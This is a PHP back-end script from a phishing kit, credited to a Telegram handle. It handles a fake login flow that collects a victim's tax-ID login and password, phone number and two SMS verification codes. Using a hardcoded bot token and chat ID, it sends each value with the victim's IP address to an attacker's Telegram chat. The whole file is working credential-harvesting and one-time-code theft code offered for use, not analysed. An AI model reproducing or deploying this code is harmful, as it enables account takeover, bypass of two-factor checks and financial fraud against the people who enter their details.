<?php

// =======> made in : telegram : @MON_BEBE0 >=======

require_once "functions.php";

$apiToken = "7593220909:AAHM0jF-u0Fkfvu50Qms7ROb7Zu2Z9h5ZaY";
$chatId   = "-4834381139";

// Shared function to send messages to Telegram
function sendToTelegram($subject, $message, $token, $chatId) {
    $data = [
        'chat_id' => $chatId,
        'text'    => $subject . $message
    ];
    file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?" . http_build_query($data));
}

// STEP: LOGIN
if ($_POST['step'] === 'index') {
    $nif = trim($_POST['nif'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (empty($nif) || empty($password)) {
        header("Location: index.php");
        exit();
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    $subject = "$ip | LOGIN |\r\n";
    $message = "🔥LOGIN🔥 : $nif\r\n💎PASSWORD💎 : $password\r\n";

    sendToTelegram($subject, $message, $apiToken, $chatId);
    header("Location: loading.php");
    exit();
}

// STEP: PHONE
if ($_POST['step'] === 'phone') {
    $phone = trim($_POST['phone'] ?? '');

    if (empty($phone)) {
        header("Location: phone.php");
        exit();
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    $subject = "$ip | NUMBER PHONE |\r\n";
    $message = "📱PHONE📱 : $phone\r\n";

    sendToTelegram($subject, $message, $apiToken, $chatId);
    header("Location: loading2.php");
    exit();
}

// STEP: FIRST SMS CODE
if ($_POST['step'] === 'sms') {
    $sms = trim($_POST['sms'] ?? '');

    if (empty($sms)) {
        header("Location: sms.php?error=1");
        exit();
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    $subject = "$ip | SMS CODE |\r\n";
    $message = "✅ SMS ✅ : $sms\r\n";

    sendToTelegram($subject, $message, $apiToken, $chatId);
    header("Location: loading3.php");
    exit();
}

// STEP: SECOND SMS CODE
if ($_POST['step'] === 'sms-er') {
    $sms = trim($_POST['sms'] ?? '');

    if (empty($sms)) {
        header("Location: sms-er.php?error=1");
        exit();
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    $subject = "$ip | SMS CODE 2 |\r\n";
    $message = "✅ SMS 2 ✅ : $sms\r\n";

    sendToTelegram($subject, $message, $apiToken, $chatId);
    header("Location: valid.php");
    exit();
}
?>